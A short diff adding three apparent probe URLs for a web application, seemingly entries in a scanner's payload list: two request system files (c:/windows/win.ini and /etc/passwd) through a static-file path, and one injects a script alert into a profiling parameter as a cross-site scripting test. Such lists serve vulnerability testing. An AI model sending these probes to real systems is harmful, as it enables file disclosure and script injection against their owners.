@@ -1,0 +1,3 @@
+/base_import/static/c:/windows/win.ini
+/base_import/static/etc/passwd
+/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>
